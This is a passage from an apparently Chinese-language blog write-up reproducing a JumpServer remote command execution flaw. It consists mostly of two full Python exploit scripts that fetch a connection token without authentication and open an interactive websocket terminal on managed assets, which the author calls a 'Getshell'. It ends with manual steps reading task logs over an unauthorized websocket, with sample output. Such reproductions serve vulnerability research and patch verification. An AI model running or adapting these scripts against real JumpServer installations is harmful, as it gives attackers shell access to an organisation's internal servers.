&quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_loop</span>(<span class="params">ws, session_id</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmdline = <span class="keyword">await</span> aioconsole.ainput()</span><br><span class="line">        <span class="keyword">await</span> send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;<span class="string">&quot;id&quot;</span>: session_id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmdline + <span class="string">&quot;\n&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">recv_loop</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_text = <span class="keyword">await</span> ws.recv()</span><br><span class="line">        ret = json.loads(recv_text)</span><br><span class="line">        <span class="keyword">if</span> ret.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;TERMINAL_DATA&quot;</span>):</span><br><span class="line">            <span class="keyword">await</span> aioconsole.aprint(ret[<span class="string">&quot;data&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>():</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> client:</span><br><span class="line">        recv_text = <span class="keyword">await</span> client.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        session_id = json.loads(recv_text)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span> + session_id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: session_id,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> send_msg(client, inittext)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.132.130:8080&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    <span class="keyword">if</span> host[-<span class="number">1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        host = host[:-<span class="number">1</span>]</span><br><span class="line">    print(host)</span><br><span class="line">    data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    res = requests.post(host + url, json=data)</span><br><span class="line">    token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    print(<span class="string">&quot;token:%s&quot;</span> % (token,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    target = (</span><br><span class="line">        <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125175214316.png" alt="image-20210125175214316"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;api&#x2F;v1&#x2F;perms&#x2F;asset-permissions&#x2F;user&#x2F;validate&#x2F;?action_name&#x3D;connect&amp;asset_id&#x3D;90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy&#x3D;1&amp;system_user_id&#x3D;8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id&#x3D;61ec790f-b47b-4cb5-b598-548a559ba44e</span><br></pre></td></tr></table></figure>
<p>2、将asset，system_user，user三个ID值放入下面脚本，Getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aioconsole</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_celery_task_log_path</span>(<span class="params">task_id</span>):</span></span><br><span class="line">    task_id = <span class="built_in">str</span>(task_id)</span><br><span class="line">    rel_path = os.path.join(task_id[<span class="number">0</span>], task_id[<span class="number">1</span>], task_id + <span class="string">&quot;.log&quot;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&quot;/opt/jumpserver/&quot;</span>, rel_path)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket, _text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_loop</span>(<span class="params">ws, session_id</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmdline = <span class="keyword">await</span> aioconsole.ainput()</span><br><span class="line">        <span class="keyword">await</span> send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;<span class="string">&quot;id&quot;</span>: session_id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmdline + <span class="string">&quot;\n&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">recv_loop</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_text = <span class="keyword">await</span> ws.recv()</span><br><span class="line">        ret = json.loads(recv_text)</span><br><span class="line">        <span class="keyword">if</span> ret.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;TERMINAL_DATA&quot;</span>):</span><br><span class="line">            <span class="keyword">await</span> aioconsole.aprint(ret[<span class="string">&quot;data&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>():</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> client:</span><br><span class="line">        recv_text = <span class="keyword">await</span> client.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        session_id = json.loads(recv_text)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span> + session_id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: session_id,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> send_msg(client, inittext)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.132.130:8080&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    <span class="keyword">if</span> host[-<span class="number">1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        host = host[:-<span class="number">1</span>]</span><br><span class="line">    print(host)</span><br><span class="line">    data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    res = requests.post(host + url, json=data)</span><br><span class="line">    token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    target = (</span><br><span class="line">        <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125215007165.png" alt="image-20210125215007165"></p>
<p>成功连接到某一台资产192.168.132.131</p>
<h2 id="脚本2"><a href="#脚本2" class="headerlink" title="脚本2"></a>脚本2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data=&#123;&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url_host=&#x27;http://192.168.1.73:8080&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     url = url_host+&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     url =url_host+&#x27;/api/v1/authentication/connection-token/?user-only=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     response = requests.post(url, json=data).json()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print(response)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     ret=requests.get(url_host+&#x27;/api/v1/authentication/connection-token/?token=%s&#x27;%response[&#x27;token&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print(ret.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_token()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=None&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务器端发送认证后的消息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket,_text</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">cmd</span>):</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> websocket:</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">resws=json.loads(recv_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = resws[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;get ws id:&quot;</span>+<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line"></span><br><span class="line">inittext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">id</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> send_msg(websocket,inittext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;exec cmd: ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmdtext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">id</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd+<span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(cmdtext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;#######finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">host=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> host[-<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"></span><br><span class="line">host=host[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(host)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;79655e4e-1741-46af-a793-fff394540a52&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line"></span><br><span class="line">res = requests.post(host + url, json=data)</span><br><span class="line"></span><br><span class="line">token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main_logic(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;python jumpserver.py http://192.168.1.73 whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h1><p>插件下载：</p>
<p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related">https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related</a></p>
<h2 id="插件验证websocket未授权"><a href="#插件验证websocket未授权" class="headerlink" title="插件验证websocket未授权"></a>插件验证websocket未授权</h2><p>url：<code>ws://192.168.132.130:8080/ws/ops/tasks/log/</code></p>
<p>Request：<code>&#123;&quot;task&quot;:&quot;/opt/jumpserver/logs/jumpserver&quot;&#125;</code></p>
<p>查看Task id的一些信息（看不到密码）</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125204724544.png" alt="image-20210125204724544"></p>
<p>获取到Task id为d4025be3-c3b6-49ca-87c6-97472450f08f</p>
<p>Request：<code>&#123;&quot;task&quot;:&quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;&#125;</code></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125205052694.png" alt="image-20210125205052694"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;task&quot;:&quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;&#125;</span><br><span class="line">&#123;&quot;message&quot;: &quot;\r\n&quot;&#125;</span><br><span class="line">&#123;&quot;message&quot;: &quot;2021-01-25 16:40:03 \u4efb\u52a1\u5f00\u59cb: \u6d4b\u8bd5\u8d44\u4ea7\u53ef\u8fde\u63a5\u6027: test(192.168.132.131)\r\r\nPLAY [\u6d4b\u8bd5\u8d44\u4ea7\u53ef\u8fde\u63a5\u6027: test(192.168.132.131)] *****************************************\r\r\nTASK [ping] ********************************************************************\r\r\n\u001b[0;32mok: [test]\u001b[0m\r\r\n2021-01-25 16:40:15 \u4efb\u52a1\u7ed3\u675f\r\r\n.\r\n\r\n.\r\r\nTask assets.tasks.asset_connectivity.test_asset_connectivity_manual[d4025be3-c3b6-49ca-87c6-97472450f08f] succeeded in 13.248451138999826s: (True, &#39;&#39;)\r\r\n&quot;, &quot;task&quot;: &quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>验证未授权存在。</p>
